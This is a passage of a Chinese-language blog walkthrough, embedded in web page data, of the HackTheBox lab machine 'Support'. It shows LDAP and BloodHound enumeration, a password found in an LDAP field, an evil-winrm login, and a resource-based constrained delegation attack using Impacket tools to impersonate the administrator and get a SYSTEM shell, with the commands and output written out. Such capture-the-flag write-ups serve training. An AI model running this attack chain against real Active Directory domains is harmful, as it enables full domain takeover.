class=\"hljs-string\"\u003e'support.htb'\u003c/span\u003e\nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: support.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 21 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 53 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: SummerMachine.support.htb\nINFO: Querying computer: Management.support.htb\nINFO: Querying computer: dc.support.htb\nWARNING: Could not resolve: SummerMachine.support.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.174@53 answered The DNS operation timed out.\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 23S\nINFO: Compressing output into 20250605003230_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们当前获得的用户 \u003ccode\u003eLdap\u003c/code\u003e 的信息，仅仅只是域成员\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-Support/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e所有的用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-Support/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们查看远程组有哪些成员\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-Support/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eSUPPORT\u003c/code\u003e用户信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-Support/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那我们大概是要先获取到\u003ccode\u003eSUPPORT\u003c/code\u003e 用户？但是现在没有别的信息了\u003c/p\u003e\n\u003ch3\u003eLDAP 信息收集\u003c/h3\u003e\n\u003cp\u003e所以我们先使用 \u003ccode\u003eLADP\u003c/code\u003e 用户进行信息收集，找一些有用的信息\u003c/p\u003e\n\u003cp\u003e我们首先查询用户信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w \u003cspan class=\"hljs-string\"\u003e'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'\u003c/span\u003e -b \u003cspan class=\"hljs-string\"\u003e'CN=USERS,DC=SUPPORT,DC=HTB'\u003c/span\u003e -D \u003cspan class=\"hljs-string\"\u003e'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e信息太多了…\u003c/p\u003e\n\u003cp\u003e我们尝试查一下\u003ccode\u003eSUPPORT\u003c/code\u003e 用户的信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w \u003cspan class=\"hljs-string\"\u003e'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'\u003c/span\u003e -b \u003cspan class=\"hljs-string\"\u003e'CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB'\u003c/span\u003e -D \u003cspan class=\"hljs-string\"\u003e'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# extended LDIF                                     \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#                                  \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# LDAPv3     \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# base \u0026#x3C;CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB\u003e with scope subtree\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# filter: (objectclass=*)\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# requesting: ALL                                                                                                 \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#                                       \u003c/span\u003e\n                                                         \n\u003cspan class=\"hljs-comment\"\u003e# support, Users, support.htb\u003c/span\u003e\ndn: CN=support,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: support    \nc: US      \nl: Chapel Hill\nst: NC\npostalCode: 27514\ndistinguishedName: CN=support,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528111200.0Z\nwhenChanged: 20220528111201.0Z\nuSNCreated: 12617\n**info: Ironside47pleasure40Watchful**\nmemberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb\nmemberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb\nuSNChanged: 12630\ncompany: support\nstreetAddress: Skipper Bowles Dr\nname: support\nobjectGUID:: CqM5MfoxMEWepIBTs5an8Q==\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中的\u003ccode\u003einfo\u003c/code\u003e字段很有趣，可能就是该用户的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003einfo: Ironside47pleasure40Watchful\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试凭据，假如该凭据有效，那么我们就可以对\u003ccode\u003eDC\u003c/code\u003e进行远程了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support nxc wmi 10.10.11.174 -u support -p \u003cspan class=\"hljs-string\"\u003e'Ironside47pleasure40Watchful'\u003c/span\u003e -d support.htb\nRPC         10.10.11.174    135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nRPC         10.10.11.174    135    DC               [+] support.htb\\support:Ironside47pleasure40Watchful\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e该凭据有效\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support evil-winrm -i 10.10.11.174 -u \u003cspan class=\"hljs-string\"\u003e'support'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Ironside47pleasure40Watchful'\u003c/span\u003e\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\support\\Documents\u003e \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSupport\u003c/code\u003e用户\u003ccode\u003eDesktop\u003c/code\u003e文件夹可以得到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\support\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\nd52f8d3f19ac0230628b1805483c760c\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e首先使用 \u003ccode\u003eWinpeas\u003c/code\u003e 走一波，没有很多的有用的信息\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eBloodHound\u003c/code\u003e再进行分析，发现\u003ccode\u003eSupport\u003c/code\u003e用户对\u003ccode\u003eDC\u003c/code\u003e有\u003ccode\u003eGenericAll\u003c/code\u003e权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-Support/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eRBCD 基于资源约束委派\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSupport\u003c/code\u003e用户对\u003ccode\u003eDC\u003c/code\u003e有\u003ccode\u003eGenericAll\u003c/code\u003e权限，我们可以完全控制\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这里可以打 \u003ccode\u003eRBCD\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e首先创建计算机账户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support addcomputer.py support.htb/support:\u003cspan class=\"hljs-string\"\u003e'Ironside47pleasure40Watchful'\u003c/span\u003e -computer-name TEST\\$ -computer-pass 123456 -dc-host support.htb -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Successfully added machine account TEST$ with password 123456.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eRBCD\u003c/code\u003e 委派设置，以\u003ccode\u003esupport\u003c/code\u003e的身份登录到\u003ccode\u003eDC\u003c/code\u003e，修改计算机账户\u003ccode\u003eDC$\u003c/code\u003e的一个属性\u003ccode\u003emsDS-AllowedToActOnBehalfOfOtherIdentity\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support rbcd.py support.htb/support:\u003cspan class=\"hljs-string\"\u003e'Ironside47pleasure40Watchful'\u003c/span\u003e -dc-ip 10.10.11.174 -action write -delegate-to DC\\$ -delegate-from TEST\\$ \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] TEST$ can now impersonate \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e on DC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     TEST$        (S-1-5-21-1677581083-3380853377-188903654-5601)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后利用 \u003ccode\u003eS4U\u003c/code\u003e 协议伪造 \u003ccode\u003eAdministrator\u003c/code\u003e 用户申请 \u003ccode\u003eST\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support getST.py -spn cifs/DC.support.htb -impersonate administrator support.htb/TEST\\$:\u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\n[*] Impersonating administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support psexec.py support.htb/administrator@dc.support.htb -k -no-pass\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.support.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file niOpACUP.exe\n[*] Opening SVCManager on dc.support.htb.....\n[*] Creating service oDhJ on dc.support.htb.....\n[*] Starting service oDhJ.....\n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nMicrosoft Windows [Version 10.0.20348.859]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\Administrator\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n89306b6f9ce190f011354f60b3342424\n\u003c/code\u003e\u003c/pre\u003e","title":"HackTheBox - Machine - Support","date":"2025-06-05","updated":"2025-06-05","tags":["HackTheBox","Windows","RBCD","Reverse"],"categories":"靶机","comments":true,"description":"Machine Support https://app.hackthebox.com/machines/Support | Windows | Easy Medium Recon 端口信息 使用 nmap 进行扫描 SMB 枚举 测试SMB是否允许匿名登录 允许匿名登录，并且在support too..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxMachine -Support"},"buildId":"rYHkFZPcHeH30wRPpLsoD","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>